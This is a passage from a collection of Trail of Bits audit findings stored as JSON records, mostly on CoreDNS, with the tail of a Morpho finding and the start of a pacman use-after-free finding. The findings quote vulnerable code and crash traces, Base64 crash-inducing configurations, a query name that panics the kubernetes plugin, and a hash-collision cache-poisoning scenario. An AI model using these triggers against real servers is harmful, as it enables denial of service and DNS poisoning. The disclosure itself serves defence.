        "body": "A common pattern in the codebase is to divide a users debt by the total supply of a token; a loss of precision in these division operations could occur, which means that the supply delta would not account for the entire matched delta amount. The impact of this potential loss of precision requires further investigation. For example, the borrowLogic method uses this pattern: toWithdraw += matchedDelta; remainingToBorrow -= matchedDelta; delta.p2pSupplyDelta -= matchedDelta.div(poolSupplyIndex); emit P2PSupplyDeltaUpdated(_poolTokenAddress, delta.p2pSupplyDelta); Figure 8.1: Part of the borrowLogic() method Here, if matchedDelta is not a multiple of poolSupplyIndex, the remainder would not be taken into account. In an extreme case, if matchedDelta is smaller than poolSupplyIndex, the result of the division operation would be zero. An attacker could exploit this loss of precision to extract small amounts of underlying tokens sitting in the Morpho contract. Exploit Scenario Bob transfers some Dai to the Morpho contract by mistake. Eve sees this transfer, deposits some collateral, and then borrows an amount of Dai from Morpho small enough that it does not aect Eve's debt. Eve withdraws her deposited collateral and walks out with Bobs Dai. Further investigation into this exploit scenario is required. Recommendations Short term, add checks to validate input data to prevent precision issues in division operations. Long term, review all the arithmetic that is vulnerable to rounding issues.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "1. Risk of a race condition in the secondary plugins setup function ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "body": "When it fails to transfer a zone from another server, the setup function of the secondary plugin prints a message to standard output. It obtains the name of the zone, stored in the variable n , from a loop and prints the message in an anonymous inner goroutine. However, the variable is not copied before being used in the anonymous goroutine, and the value that n points to is likely to change by the time the scheduler executes the goroutine. Consequently, the value of n will be inaccurate when it is printed. 19 24 26 27 29 30 31 32 35 36 40 func setup(c *caddy.Controller) error { // (...). for _, n := range zones.Names { // (...) c.OnStartup( func () error { z.StartupOnce.Do( func () { go func () { // (...) for { // (...) log.Warningf( \"All '%s' masters failed to transfer, retrying in %s: %s\" , n , dur.String(), err) // (...) 41 46 47 48 49 50 51 52 53 } } } z.Update() }() }) return nil }) Figure 1.1: The value of n is not copied before it is used in the anonymous goroutine and could be logged incorrectly. ( plugin/secondary/setup.go#L19-L53 ) Exploit Scenario An operator of a CoreDNS server enables the secondary plugin. The operator sees an error in the standard output indicating that the zone transfer failed. However, the error points to an invalid zone, making it more dicult for the operator to troubleshoot and x the issue. Recommendations Short term, create a copy of n before it is used in the anonymous goroutine. See Appendix B for a proof of concept demonstrating this issue and an example of the x. Long term, integrate  anonymous-race-condition Semgrep rule into the CI/CD pipeline to catch this type of race condition.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "2. Upstream errors captured in the grpc plugin are not returned ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "body": "In the ServeDNS implementation of the grpc plugin, upstream errors are captured in a loop. However, once an error is captured in the upstreamErr variable, the function exits with a nil error; this is because there is no break statement forcing the function to exit the loop and to reach a return statement, at which point it would return the error value. The ServeDNS function of the forward plugin includes a similar but correct implementation. func (g *GRPC) ServeDNS(ctx context.Context, w dns.ResponseWriter, r *dns.Msg) ( int , error ) { // (...) upstreamErr = err // Check if the reply is correct; if not return FormErr. if !state.Match(ret) { debug.Hexdumpf(ret, \"Wrong reply for id: %d, %s %d\" , ret.Id, state.QName(), state.QType()) formerr := new (dns.Msg) formerr.SetRcode(state.Req, dns.RcodeFormatError) w.WriteMsg(formerr) return 0 , nil } w.WriteMsg(ret) return 0 , nil } if upstreamErr != nil { return dns.RcodeServerFailure, upstreamErr } Figure 2.1: plugin/secondary/setup.go#L19-L53 Exploit Scenario An operator runs CoreDNS with the grpc plugin. Upstream errors cause the gRPC functionality to fail. However, because the errors are not logged, the operator remains unaware of their root cause and has diculty troubleshooting and remediating the issue. Recommendations Short term, correct the ineectual assignment to ensure that errors captured by the plugin are returned. Long term, integrate ineffassign into the CI/CD pipeline to catch this and similar issues.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "3. Index-out-of-range panic in autopath plugin initialization ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "body": "The following syntax is used to congure the autopath plugin: autopath [ZONE...] RESOLV-CONF The RESOLV-CONF parameter can point to a resolv.conf(5) conguration le or to another plugin, if the string in the resolv variable is prexed with an @ symbol (e.g., @kubernetes). However, the autoPathParse function does not ensure that the length of the RESOLV-CONF parameter is greater than zero before dereferencing its rst element and comparing it with the @ character. func autoPathParse(c *caddy.Controller) (*AutoPath, string , error ) { ap := &AutoPath{} mw := \"\" for c.Next() { zoneAndresolv := c.RemainingArgs() if len (zoneAndresolv) < 1 { return ap, \"\" , fmt.Errorf( \"no resolv-conf specified\" ) } resolv := zoneAndresolv[ len (zoneAndresolv)- 1 ] if resolv[ 0 ] == '@' { mw = resolv[ 1 :] Figure 3.1: The length of resolv may be zero when the rst element is checked. ( plugin/autopath/setup.go#L45-L54 ) Specifying a conguration le with a zero-length RESOLV-CONF parameter, as shown in gure 3.2, would cause CoreDNS to panic. 0 autopath \"\" Figure 3.2: An autopath conguration with a zero-length RESOLV-CONF parameter panic: runtime error: index out of range [0] with length 0 goroutine 1 [running]: github.com/coredns/coredns/plugin/autopath.autoPathParse(0xc000518870) /home/ubuntu/audit-coredns/client-code/coredns/plugin/autopath/setup.go:53 +0x35c github.com/coredns/coredns/plugin/autopath.setup(0xc000518870) /home/ubuntu/audit-coredns/client-code/coredns/plugin/autopath/setup.go:16 +0x33 github.com/coredns/caddy.executeDirectives(0xc00029eb00, {0x7ffdc770671b, 0x8}, {0x324cfa0, 0x31, 0x1000000004b7e06}, {0xc000543260, 0x1, 0x8}, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:661 +0x5f6 github.com/coredns/caddy.ValidateAndExecuteDirectives({0x22394b8, 0xc0003e8a00}, 0xc0003e8a00, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:612 +0x3e5 github.com/coredns/caddy.startWithListenerFds({0x22394b8, 0xc0003e8a00}, 0xc00029eb00, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:515 +0x274 github.com/coredns/caddy.Start({0x22394b8, 0xc0003e8a00}) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:472 +0xe5 github.com/coredns/coredns/coremain.Run() /home/ubuntu/audit-coredns/client-code/coredns/coremain/run.go:62 +0x1cd main.main() /home/ubuntu/audit-coredns/client-code/coredns/coredns.go:12 +0x17 Figure 3.3: CoreDNS panics when loading the autopath conguration. Exploit Scenario An operator of a CoreDNS server provides an empty RESOLV-CONF parameter when conguring the autopath plugin, causing a panic. Because CoreDNS does not provide a clear explanation of what went wrong, it is dicult for the operator to troubleshoot and x the issue. Recommendations Short term, verify that the resolv variable is a non-empty string before indexing it. Long term, review the codebase for instances in which data is indexed without undergoing a length check; handling untrusted data in this way may lead to a more severe denial of service (DoS).",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "4. Index-out-of-range panic in forward plugin initialization ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "body": "Initializing the forward plugin involves parsing the relevant conguration section. func parseStanza(c *caddy.Controller) (*Forward, error ) { f := New() if !c.Args(&f.from) { return f, c.ArgErr() } origFrom := f.from zones := plugin.Host(f.from).NormalizeExact() f.from = zones[ 0 ] // there can only be one here, won't work with non-octet reverse Figure 4.1: The length of the zones variable may be zero when the rst element is checked. ( plugin/forward/setup.go#L89-L97 ) An invalid conguration le for the forward plugin could cause the zones variable to have a length of zero. A Base64-encoded example of such a conguration le is shown in gure 4.2. Lgpmb3J3YXJkIE5vTWF0Pk69VL0vvVN0ZXJhbENoYXJDbGFzc0FueUNoYXJOb3ROTEEniez6bnlDaGFyQmVnaW5MaW5l RW5kTGluZUJlZ2luVGV4dEVuZFRleHRXb3JkQm91bmRhcnlOb1dvYXRpbmcgc3lzdGVtIDogImV4dCIsICJ4ZnMiLCAi bnRTaW50NjRLaW5kZnMiLiB5IGluZmVycmVkIHRvIGJlIGV4dCBpZiB1bnNwZWNpZmllZCBlIDogaHR0cHM6Di9rdWJl cm5ldGVzaW9kb2NzY29uY2VwdHNzdG9yYWdldm9sdW1lcyMgIiIiIiIiIiIiIiIiJyCFmIWlsZj//4WuhZilr4WY5bCR mPCd Figure 4.2: The Base64-encoded forward conguration le Specifying a conguration le like that shown above would cause CoreDNS to panic when attempting to access the rst element of zones : panic: runtime error: index out of range [0] with length 0 goroutine 1 [running]: github.com/coredns/coredns/plugin/forward.parseStanza(0xc000440000) /home/ubuntu/audit-coredns/client-code/coredns/plugin/forward/setup.go:97 +0x972 github.com/coredns/coredns/plugin/forward.parseForward(0xc000440000) /home/ubuntu/audit-coredns/client-code/coredns/plugin/forward/setup.go:81 +0x5e github.com/coredns/coredns/plugin/forward.setup(0xc000440000) /home/ubuntu/audit-coredns/client-code/coredns/plugin/forward/setup.go:22 +0x33 github.com/coredns/caddy.executeDirectives(0xc0000ea800, {0x7ffdf9f6e6ed, 0x36}, {0x324cfa0, 0x31, 0x1000000004b7e06}, {0xc00056a860, 0x1, 0x8}, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:661 +0x5f6 github.com/coredns/caddy.ValidateAndExecuteDirectives({0x22394b8, 0xc00024ea80}, 0xc00024ea80, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:612 +0x3e5 github.com/coredns/caddy.startWithListenerFds({0x22394b8, 0xc00024ea80}, 0xc0000ea800, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:515 +0x274 github.com/coredns/caddy.Start({0x22394b8, 0xc00024ea80}) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:472 +0xe5 github.com/coredns/coredns/coremain.Run() /home/ubuntu/audit-coredns/client-code/coredns/coremain/run.go:62 +0x1cd main.main() /home/ubuntu/audit-coredns/client-code/coredns/coredns.go:12 +0x17 Figure 4.3: CoreDNS panics when loading the forward conguration. Exploit Scenario An operator of a CoreDNS server miscongures the forward plugin, causing a panic. Because CoreDNS does not provide a clear explanation of what went wrong, it is dicult for the operator to troubleshoot and x the issue. Recommendations Short term, verify that the zones variable has the correct number of elements before indexing it. Long term, review the codebase for instances in which data is indexed without undergoing a length check; handling untrusted data in this way may lead to a more severe DoS.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "5. Use of deprecated PreferServerCipherSuites eld ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "body": "In the setTLSDefaults function of the tls plugin, the TLS conguration object includes a PreferServerCipherSuites eld, which is set to true . func setTLSDefaults(tls *ctls.Config) { tls.MinVersion = ctls.VersionTLS12 tls.MaxVersion = ctls.VersionTLS13 tls.CipherSuites = [] uint16 { ctls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384, ctls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384, ctls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305, ctls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305, ctls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, ctls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, ctls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384, ctls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384, ctls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, } tls.PreferServerCipherSuites = true } Figure 5.1: plugin/tls/tls.go#L22-L37 In the past, this property controlled whether a TLS connection would use the cipher suites preferred by the server or by the client. However, as of Go 1.17, this eld is ignored. According to the Go documentation for crypto/tls , Servers now select the best mutually supported cipher suite based on logic that takes into account inferred client hardware, server hardware, and security. When CoreDNS is built using a recent Go version, the use of this property is redundant and may lead to false assumptions about how cipher suites are negotiated in a connection to a CoreDNS server. Recommendations Short term, add this issue to the internal issue tracker. Additionally, when support for Go versions older than 1.17 is entirely phased out of CoreDNS, remove the assignment to the deprecated PreferServerCipherSuites eld.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "6. Use of the MD5 hash function to detect Corele changes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "body": "The reload plugin is designed to automatically detect changes to a Corele and to reload it if necessary. To determine whether a le has changed, the plugin periodically compares the current MD5 hash of the le to the last hash calculated for it ( plugin/reload/reload.go#L81-L107 ). If the values are dierent, it reloads the Corele. However, the MD5 hash functions vulnerability to collisions decreases the reliability of this process; if two dierent les produce the same hash value, the plugin will not detect the dierence between them. Exploit Scenario An operator of a CoreDNS server modies a Corele, but the MD5 hash of the modied le collides with that of the old le. As a result, the reload plugin does not detect the change. Instead, it continues to use the outdated server conguration without alerting the operator to its use. Recommendations Short term, improve the robustness of the reload plugin by using the SHA-512 hash function instead of MD5.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Use of default math/rand seed in grpc and forward plugins random server-selection policy ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "body": "The grpc and forward plugins use the random policy for selecting upstream servers. The implementation of this policy in the two plugins is identical and uses the math/rand package from the Go standard library. func (r *random) List(p []*Proxy) []*Proxy { switch len (p) { case 1 : return p case 2 : if rand.Int()% 2 == 0 { return []*Proxy{p[ 1 ], p[ 0 ]} // swap } return p } perms := rand.Perm( len (p)) rnd := make ([]*Proxy, len (p)) for i, p1 := range perms { rnd[i] = p[p1] } return rnd } Figure 7.1: plugin/grpc/policy.go#L19-L37 As highlighted in gure 7.1, the random policy uses either rand.Int or rand.Perm to choose the order of the upstream servers, depending on the number of servers that have been congured. Unless a program using the random policy explicitly calls rand.Seed , the top-level functions rand.Int and rand.Perm behave as if they were seeded with the value 1 , which is the default seed for math/rand . CoreDNS does not call rand.Seed to seed the global state of math/rand . Without this call, the grpc and forward plugins random selection of upstream servers is likely to be trivially predictable and the same every time CoreDNS is restarted. Exploit Scenario An attacker targets a CoreDNS instance in which the grpc or forward plugin is enabled. The attacker exploits the deterministic selection of upstream servers to overwhelm a specic server, with the goal of causing a DoS condition or performing an attack such as a timing attack. Recommendations Short term, instantiate a rand.Rand type with a unique seed, rather than drawing random numbers from the global math/rand state. CoreDNS takes this approach in several other areas, such as the loop plugin .",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. Cache plugin does not account for hash table collisions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "body": "To cache a DNS reply, CoreDNS maps the FNV-1 hash of the query name and type to the content of the reply in a hash table entry. func key(qname string , m *dns.Msg, t response.Type) ( bool , uint64 ) { // We don't store truncated responses. if m.Truncated { return false , 0 } // Nor errors or Meta or Update. if t == response.OtherError || t == response.Meta || t == response.Update { return false , 0 } return true , hash(qname, m.Question[ 0 ].Qtype) } func hash(qname string , qtype uint16 ) uint64 { h := fnv.New64() h.Write([] byte { byte (qtype >> 8 )}) h.Write([] byte { byte (qtype)}) h.Write([] byte (qname)) return h.Sum64() } Figure 8.1: plugin/cache/cache.go#L68-L87 To check whether there is a cached reply for an incoming query, CoreDNS performs a hash table lookup for the query name and type. If it identies a reply with a valid time to live (TTL), it returns the reply. CoreDNS assumes the stored DNS reply to be the correct one for the query, given the use of a hash table mapping. However, this assumption is faulty, as FNV-1 is a non-cryptographic hash function that does not oer collision resistance, and there exist utilities for generating colliding inputs to FNV-1 . As a result, it is likely possible to construct a valid (qname , qtype) pair that collides with another one, in which case CoreDNS could serve the incorrect cached reply to a client. Exploit Scenario An attacker aiming to poison the cache of a CoreDNS server generates a valid (qname* , qtype*) pair whose FNV-1 hash collides with a commonly queried (qname , qtype) pair. The attacker gains control of the authoritative name server for qname* and points its qtype* record to an address of his or her choosing. The attacker also congures the server to send a second record when (qname* , qtype*) is queried: a qtype record for qname that points to a malicious address. The attacker queries the CoreDNS server for (qname* , qtype*) , and the server caches the reply with the malicious address. Soon thereafter, when a legitimate user queries the server for (qname , qtype) , CoreDNS serves the user the cached reply for (qname* , qtype*) , since it has an identical FNV-1 hash. As a result, the legitimate users DNS client sees the malicious address as the record for qname . Recommendations Short term, store the original name and type of a query in the value of a hash table entry. After looking up the key for an incoming request in the hash table, verify that the query name and type recorded alongside the cached reply match those of the request. If they do not, disregard the cached reply. Short term, use the keyed hash function SipHash instead of FNV-1. SipHash was designed for speed and derives a 64-bit output value from an input value and a 128-bit secret key; this method adds pseudorandomness to a hash table key and makes it more dicult for an attacker to generate collisions oine. CoreDNS should use the crypto/rand package from Gos standard library to generate a cryptographically random secret key for SipHash on startup.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "9. Index-out-of-range reference in kubernetes plugin ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "body": "The parseRequest function of the kubernetes plugin parses a DNS request before using it to query Kubernetes. By fuzzing the function, we discovered an out-of-range issue that can cause a panic. The issue occurs when the function calls stripUnderscore with an empty string, as it does when it receives a request with the qname .o.o.po.pod.8 and the zone interwebs. // stripUnderscore removes a prefixed underscore from s. func stripUnderscore(s string ) string { if s[ 0 ] != '_' { return s } return s[ 1 :] } Figure 9.1: plugin/kubernetes/parse.go#L97 Because of the time constraints of the audit, we could not nd a way to directly exploit this vulnerability. Although certain tools for sending DNS queries, like dig and host , verify the validity of a host before submitting a DNS query, it may be possible to exploit the vulnerability by using custom tooling or DNS over HTTPs (DoH). Exploit Scenario An attacker nds a way to submit a query with an invalid host (such as o.o.po.pod.8) to a CoreDNS server running as the DNS server for a Kubernetes endpoint. Because of the index-out-of-range bug, the kubernetes plugin causes CoreDNS to panic and crash, resulting in a DoS. Recommendations Short term, to prevent a panic, implement a check of the value of the string passed to the stripUnderscore function.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "10. Calls to time.After() in select statements can lead to memory leaks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "body": "Calls to the time.After function in select/case statements within for loops can lead to memory leaks. This is because the garbage collector does not clean up the underlying Timer object until the timer has red. A new timer is initialized at the start of each iteration of the for loop (and therefore with each select statement), which requires resources. As a result, if many routines originate from a time.After call, the system may experience memory overconsumption. for { select { case <-ctx.Done(): log.Debugf( \"Breaking out of CloudDNS update loop for %v: %v\" , h.zoneNames, ctx.Err()) return case <-time.After( 1 * time.Minute) : if err := h.updateZones(ctx); err != nil && ctx.Err() == nil /* Don't log error if ctx expired. */ { log.Errorf( \"Failed to update zones %v: %v\" , h.zoneNames, err) } Figure 10.1: A time.After() routine that causes a memory leak ( plugin/clouddns/clouddns.go#L85-L93 ) The following portions of the code contain similar patterns:  plugin/clouddns/clouddns.go#L85-L93  plugin/azure/azure.go#L87-96  plugin/route53/route53.go#87-96 Exploit Scenario An attacker nds a way to overuse a function, which leads to overconsumption of a CoreDNS servers memory and a crash. Recommendations Short term, use a ticker instead of the time.After function in select/case statements included in for loops. This will prevent memory leaks and crashes caused by memory exhaustion. Long term, avoid using the time.After method in for-select routines and periodically use a Semgrep query to detect similar patterns in the code. References  DevelopPaper post on the memory leak vulnerability in time.After   Golang <-time.After() Is Not Garbage Collected before Expiry  (Medium post)",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Incomplete list of debugging data exposed by the prometheus plugin ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "body": "Enabling the prometheus (metrics) plugin exposes an HTTP endpoint that lists CoreDNS metrics. The documentation for the plugin indicates that it reports data such as the total number of queries and the size of responses. However, other data that is reported by the plugin (and also available through the pprof plugin) is not listed in the documentation. This includes Go runtime debugging information such as the number of running goroutines and the duration of Go garbage collection runs. Because this data is not listed in the prometheus plugin documentation, operators may initially be unaware of its exposure. Moreover, the data could be instrumental in formulating an attack. # TYPE go_gc_duration_seconds summary go_gc_duration_seconds{quantile=\"0\"} 4.4756e-05 go_gc_duration_seconds{quantile=\"0.25\"} 6.0522e-05 go_gc_duration_seconds{quantile=\"0.5\"} 7.1476e-05 go_gc_duration_seconds{quantile=\"0.75\"} 0.000105802 go_gc_duration_seconds{quantile=\"1\"} 0.000205775 go_gc_duration_seconds_sum 0.010425592 go_gc_duration_seconds_count 123 # HELP go_goroutines Number of goroutines that currently exist. # TYPE go_goroutines gauge go_goroutines 18 # HELP go_info Information about the Go environment. # TYPE go_info gauge go_info{version=\"go1.17.3\"} 1 # HELP go_memstats_alloc_bytes Number of bytes allocated and still in use. # TYPE go_memstats_alloc_bytes gauge Figure 11.1: Examples of the data exposed by prometheus and omitted from the documentation Exploit Scenario An attacker discovers the metrics exposed by CoreDNS over port 9253. The attacker then monitors the endpoint to determine the eectiveness of various attacks in crashing the server. Recommendations Short term, document all data exposed by the prometheus plugin. Additionally, consider changing the data exposed by the prometheus plugin to exclude Go runtime data available through the pprof plugin.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Cloud integrations require cleartext storage of keys in the Corele ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "body": "The route53 , azure , and clouddns plugins enable CoreDNS to interact with cloud providers (AWS, Azure, and the Google Cloud Platform (GCP), respectively). To access clouddns , a user enters the path to the le containing his or her GCP credentials. When using route53 , CoreDNS pulls the AWS credentials that the user has entered in the Corele. If the AWS credentials are not included in the Corele, CoreDNS will pull them in the same way that the AWS command-line interface (CLI) would. While operators have options for the way that they provide AWS and GCP credentials, Azure credentials must be pulled directly from the Corele. Furthermore, the CoreDNS documentation lacks guidance on the risks of storing AWS, Azure, or GCP credentials in local conguration les . Exploit Scenario An attacker or malicious internal user gains access to a server running CoreDNS. The malicious actor then locates the Corele and obtains credentials for a cloud provider, thereby gaining access to a cloud infrastructure. Recommendations Short term, remove support for entering cloud provider credentials in the Corele in cleartext. Instead, load credentials for each provider in the manner recommended in that providers documentation and implemented by its CLI utility. CoreDNS should also refuse to load credential les with overly broad permissions and warn users about the risks of such les.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Lack of rate-limiting controls ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "body": "CoreDNS does not enforce rate limiting of DNS queries, including those sent via DoH. As a result, we were able to issue the same request thousands of times in less than one minute over the HTTP endpoint /dns-query . Figure 13.1: We sent 3,424 requests to CoreDNS without being rate limited. During our tests, the lack of rate limiting did not appear to aect the application. However, processing requests sent at such a high rate can consume an inordinate amount of host resources, and a lack of rate limiting can facilitate DoS and DNS amplication attacks. Exploit Scenario An attacker oods a CoreDNS server with HTTP requests, leading to a DoS condition. Recommendations Short term, consider incorporating the rrl plugin, used for the rate limiting of DNS queries, into the CoreDNS codebase. Additionally, implement rate limiting on all API endpoints. An upper bound can be applied at a high level to all endpoints exposed by CoreDNS. Long term, run stress tests to ensure that the rate limiting enforced by CoreDNS is robust.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "14. Lack of a limit on the size of response bodies ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "body": "The ioutil.ReadAll function reads from a source input until encountering an error or the end of the le, at which point it returns the data that it read. The toMsg function, which processes requests for the HTTP server, uses ioutil.ReadAll to parse requests and to read POST bodies. However, there is no limit on the size of request bodies. Using ioutil.ReadAll to parse a large request that is loaded multiple times may exhaust the systems memory, causing a DoS. func toMsg(r io.ReadCloser) (*dns.Msg, error ) { buf, err := io.ReadAll(r) if err != nil { return nil , err } m := new (dns.Msg) err = m.Unpack(buf) return m, err } Figure 14.1: plugin/pkg/doh/doh.go#L94-L102 Exploit Scenario An attacker generates multiple POST requests with long request bodies to /dns-query , leading to the exhaustion of its resources. Recommendations Short term, use the io.LimitReader function or another mechanism to limit the size of request bodies. Long term, consider implementing application-wide limits on the size of request bodies to prevent DoS attacks.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Index-out-of-range panic in grpc plugin initialization ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf",
        "body": "Initializing the grpc plugin involves parsing the relevant conguration section. func parseStanza(c *caddy.Controller) (*GRPC, error ) { g := newGRPC() if !c.Args(&g.from) { return g, c.ArgErr() } g.from = plugin.Host(g.from).NormalizeExact()[ 0 ] // only the first is used. Figure 15.1: plugin/grpc/setup.go#L53-L59 An invalid conguration le for the grpc plugin could cause the call to NormalizeExtract (highlighted in gure 15.1) to return a value with zero elements. A Base64-encoded example of such a conguration le is shown below. MApncnBjIDAwMDAwMDAwMDAwhK2FhYKtMIStMITY2NnY2dnY7w== Figure 15.2: The Base64-encoded grpc conguration le Specifying a conguration le like that in gure 15.2 would cause CoreDNS to panic when attempting to access the rst element of the return value. panic: runtime error: index out of range [0] with length 0 goroutine 1 [running]: github.com/coredns/coredns/plugin/grpc.parseStanza(0xc0002f0900) /home/ubuntu/audit-coredns/client-code/coredns/plugin/grpc/setup.go:59 +0x31b github.com/coredns/coredns/plugin/grpc.parseGRPC(0xc0002f0900) /home/ubuntu/audit-coredns/client-code/coredns/plugin/grpc/setup.go:45 +0x5e github.com/coredns/coredns/plugin/grpc.setup(0x1e4dcc0) /home/ubuntu/audit-coredns/client-code/coredns/plugin/grpc/setup.go:17 +0x30 github.com/coredns/caddy.executeDirectives(0xc0000e2900, {0x7ffc15b696e0, 0x31}, {0x324cfa0, 0x31, 0x1000000004b7e06}, {0xc000269300, 0x1, 0x8}, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:661 +0x5f6 github.com/coredns/caddy.ValidateAndExecuteDirectives({0x2239518, 0xc0002b2980}, 0xc0002b2980, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:612 +0x3e5 github.com/coredns/caddy.startWithListenerFds({0x2239518, 0xc0002b2980}, 0xc0000e2900, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:515 +0x274 github.com/coredns/caddy.Start({0x2239518, 0xc0002b2980}) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:472 +0xe5 github.com/coredns/coredns/coremain.Run() /home/ubuntu/audit-coredns/client-code/coredns/coremain/run.go:62 +0x1cd main.main() /home/ubuntu/audit-coredns/client-code/coredns/coredns.go:12 +0x17 Figure 15.3: CoreDNS panics when loading the grpc conguration. Exploit Scenario An operator of a CoreDNS server miscongures the grpc plugin, causing a panic. Because CoreDNS does not provide a clear explanation of what went wrong, it is dicult for the operator to troubleshoot and x the issue. Recommendations Short term, verify that the variable returned by NormalizeExtract has at least one element before indexing it. Long term, review the codebase for instances in which data is indexed without undergoing a length check; handling untrusted data in this way may lead to a more severe DoS. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "1. Use-after-free vulnerability in the print_packages function ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-pacman-securityreview.pdf",
        "body": "The print_packages function is subject to a use-after-free vulnerability. The function rst deallocates memory for the temp variable and then uses that memory in the PRINT_FORMAT_STRING macro (gure 1.1), which can lead to the following issues:  Potential exploitation of the program could occur if an attacker can allocate and control the value of the temp variable after it is freed (highlighted line 1 in gure 1.1) and before it is used in another thread (highlighted line 2 in gure 1.1). The time window for the attack is very small since the two operations happen one after another. void print_packages( const alpm_list_t *packages) { ... /* %s : size */ if (strstr(temp, \"%s\" )) { char *size; pm_asprintf(&size, \"%jd\" , ( intmax_t )pkg_get_size(pkg)); string = strreplace(temp, \"%s\" , size); free(size); free(temp); // (1) memory pointed by the temp variable is freed } /* %u : url */ PRINT_FORMAT_STRING(temp, \"%u\" , alpm_pkg_get_url) // (2) use-after-free of temp Figure 1.1: pacman/src/pacman/util.c#L12581267  A double free, if detected by the allocator, would cause a program crash. The second free is called in the PRINT_FORMAT_STRING macro. #define PRINT_FORMAT_STRING(temp, format, func) \\ if(strstr(temp, format)) { \\ string = strreplace(temp, format, func(pkg)); \\ free(temp); \\ temp = string; \\ } \\ Figure 1.2: The PRINT_FORMAT_STRING macro denition The severity of this nding has been set to low since the rst scenario should not be possible because Pacman does not use multiple threads. This issue was found with the scan-build static analyzer but can also be detected with tools such as Valgrind (gure 1.3) or AddressSanitizer (ASan). at 0x484D11D : strstr (vg_replace_strmem.c: 1792 ) by 0x12620B : print_packages (util.c: 1267 ) by 0x11F9DA : sync_prepare_execute (sync.c: 817 ) by 0x11F550 : sync_trans (sync.c: 728 ) by 0x11FF72 : pacman_sync (sync.c: 965 ) by 0x11B5EB : main (pacman.c: 1259 ) # valgrind ./pacman -S --print --print-format '%s' valgrind == 2084 == Memcheck, a memory error detector == 2084 == Copyright (C) 2002-2022 , and GNU GPL'd, by Julian Seward 